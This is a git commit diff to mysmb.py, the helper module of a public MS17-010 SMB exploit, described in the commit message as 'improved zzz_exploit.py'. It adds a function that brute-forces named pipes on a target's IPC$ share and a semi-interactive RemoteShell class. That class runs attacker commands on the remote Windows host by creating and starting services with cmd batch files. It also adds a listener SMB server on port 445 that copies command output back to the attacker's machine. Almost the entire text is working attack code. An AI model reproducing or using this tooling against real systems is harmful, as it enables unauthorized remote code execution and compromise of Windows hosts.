ba52d0452e4bfacd3c9a41f510d31cadabd611c1
deus-ex-silicium <9478653+deus-ex-silicium@users.noreply.github.com>
2019-09-02 10:52:20 +0200

    added improved zzz_exploit.py and mysmb with more named pipes

--- mysmb.py
+++ mysmb.py
@@ -6,7 +6,6 @@ from struct import pack
 import os
 import random
 
-
 def getNTStatus(self):
 	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
 setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)
@@ -116,6 +115,28 @@ class MYSMB(smb.SMB):
 		self._last_fid = 0  # last fid from nt_create_andx()
 		self._smbConn = None
 		smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)
+
+	def find_named_pipe(self):
+		pipes_file = '/usr/share/metasploit-framework/data/wordlists/named_pipes.txt'
+		try:
+			with open(pipes_file) as f:
+				pipes = [ x.strip() for x in f.readlines()]
+		except IOError as e:
+			print("[-] Could not open {}, trying hardcoded values".format(pipes_file))
+			pipes = [ 'netlogon', 'lsarpc', 'samr', 'browser', 'spoolss', 'atsvc', 'DAV RPC SERVICE', 'epmapper', 'eventlog', 'InitShutdown', 'keysvc', 'lsass', 'LSM_API_service', 'ntsvcs', 'plugplay', 'protected_storage', 'router', 'SapiServerPipeS-1-5-5-0-70123', 'scerpc', 'srvsvc', 'tapsrv', 'trkwks', 'W32TIME_ALT', 'wkssvc','PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER', 'db2remotecmd' ]
+		tid = self.tree_connect_andx('\\\\'+self.get_remote_host()+'\\'+'IPC$')
+		found_pipe = None
+		for pipe in pipes:
+			try:
+				fid = self.nt_create_andx(tid, pipe)
+				self.close(tid, fid)
+				found_pipe = pipe
+				break
+			except smb.SessionError as e:
+				pass
+		
+		self.disconnect_tree(tid)
+		return found_pipe
 
 	def set_pid(self, pid):
 		self._pid = pid
@@ -378,4 +399,179 @@ class MYSMB(smb.SMB):
 			data += resp['Data'][1:]  # skip padding
 			#print(len(data))
 		return data
+
+class RemoteShell(cmd.Cmd):
+    def __init__(self, share, rpc, mode, serviceName):
+        cmd.Cmd.__init__(self)
+        self.__share = share
+        self.__mode = mode
+        self.__outputFilename = ''.join([random.choice(string.letters) for _ in range(4)])
+        self.__output = '\\\\127.0.0.1\\{}\\{}'.format(self.__share,self.__outputFilename)
+        self.__batchFile = '%TEMP%\\{}.bat'.format(''.join([random.choice(string.letters) for _ in range(4)]))  
+        self.__outputBuffer = b''
+        self.__command = ''
+        self.__shell = '%COMSPEC% /Q /c '
+        self.__serviceName = serviceName
+        self.__rpc = rpc
+        self.intro = '[!] Dropping a semi-interactive shell (remember to escape special chars with ^) \n[!] Executing interactive programs will hang shell!' 
+
+        self.__scmr = rpc.get_dce_rpc('svcctl')
+        try:
+            self.__scmr.connect()
+        except Exception as e:
+            logging.critical(str(e))
+            sys.exit(1)
+
+        s = rpc.get_smbconnection()
+
+        # We don't wanna deal with timeouts from now on.
+        s.setTimeout(100000)
+        if mode == 'SERVER':
+            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
+            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
+
+        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+        resp = scmr.hROpenSCManagerW(self.__scmr)
+        self.__scHandle = resp['lpScHandle']
+        self.transferClient = rpc.get_smbconnection()
+        self.do_cd('')
+
+    def finish(self):
+        # Just in case the service is still created
+        try:
+           self.__scmr = self.__rpc.get_dce_rpc()
+           self.__scmr.connect() 
+           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+           resp = scmr.hROpenSCManagerW(self.__scmr)
+           self.__scHandle = resp['lpScHandle']
+           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
+           service = resp['lpServiceHandle']
+           scmr.hRDeleteService(self.__scmr, service)
+           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
+           scmr.hRCloseServiceHandle(self.__scmr, service)
+        except scmr.DCERPCException:
+           pass
+
+    def do_shell(self, s):
+        os.system(s)
+
+    def do_exit(self, s):
+        return True
+
+    def emptyline(self):
+        return False
+
+    def do_cd(self, s):
+        # We just can't CD or maintain track of the target dir.
+        if len(s) > 0:
+            logging.error("You can't CD under SMBEXEC. Use full paths.")
+
+        self.execute_remote('cd ' )
+        if len(self.__outputBuffer) > 0:
+            # Stripping CR/LF
+            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
+            self.__outputBuffer = b''
+
+    def do_CD(self, s):
+        return self.do_cd(s)
+
+    def default(self, line):
+        if line != '':
+            self.send_data(line)
+
+    def get_output(self):
+        def output_callback(data):
+            self.__outputBuffer += data
+
+        if self.__mode == 'SHARE':
+            self.transferClient.getFile(self.__share, self.__outputFilename, output_callback)
+            self.transferClient.deleteFile(self.__share, self.__outputFilename)
+        else:
+            fd = open(SMBSERVER_DIR + '/' + self.__outputFilename,'r')
+            output_callback(fd.read())
+            fd.close()
+            os.unlink(SMBSERVER_DIR + '/' + self.__outputFilename)
+
+    def execute_remote(self, data):
+        to_batch = '{} echo {} ^> {} 2^>^&1 > {}'.format(self.__shell, data, self.__output, self.__batchFile)
+        command = '{} & {} {}'.format(to_batch, self.__shell, self.__batchFile)
+        if self.__mode == 'SERVER':
+            command += ' & ' + self.__copyBack
+        command = '{} & del {}'.format(command, self.__batchFile )
+        logging.debug('Executing %s' % command)
+        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
+                                        lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
+        service = resp['lpServiceHandle']
+
+        try:
+            scmr.hRStartServiceW(self.__scmr, service)
+        except:
+            pass
+        scmr.hRDeleteService(self.__scmr, service)
+        scmr.hRCloseServiceHandle(self.__scmr, service)
+        self.get_output()
+        #print(self.__outputBuffer)
+
+    def send_data(self, data):
+        self.execute_remote(data)
+        print(self.__outputBuffer.decode())
+        self.__outputBuffer = b''
+
+class SMBServer(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+        self.smb = None
+
+    def cleanup_server(self):
+        logging.info('Cleaning up..')
+        try:
+            os.unlink(SMBSERVER_DIR + '/smb.log')
+        except:
+            pass
+        os.rmdir(SMBSERVER_DIR)
+
+    def run(self):
+        # Here we write a mini config for the server
+        smbConfig = ConfigParser.ConfigParser()
+        smbConfig.add_section('global')
+        smbConfig.set('global','server_name','server_name')
+        smbConfig.set('global','server_os','UNIX')
+        smbConfig.set('global','server_domain','WORKGROUP')
+        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
+        smbConfig.set('global','credentials_file','')
+
+        # Let's add a dummy share
+        smbConfig.add_section(DUMMY_SHARE)
+        smbConfig.set(DUMMY_SHARE,'comment','')
+        smbConfig.set(DUMMY_SHARE,'read only','no')
+        smbConfig.set(DUMMY_SHARE,'share type','0')
+        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)
+
+        # IPC always needed
+        smbConfig.add_section('IPC$')
+        smbConfig.set('IPC$','comment','')
+        smbConfig.set('IPC$','read only','yes')
+        smbConfig.set('IPC$','share type','3')
+        smbConfig.set('IPC$','path')
+
+        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
+        logging.info('Creating tmp directory')
+        try:
+            os.mkdir(SMBSERVER_DIR)
+        except Exception, e:
+            logging.critical(str(e))
+            pass
+        logging.info('Setting up SMB Server')
+        self.smb.processConfigFile()
+        logging.info('Ready to listen...')
+        try:
+            self.smb.serve_forever()
+        except:
+            pass
+
+    def stop(self):
+        self.cleanup_server()
+        self.smb.socket.close()
+        self.smb.server_close()
+        self._Thread__stop()
 
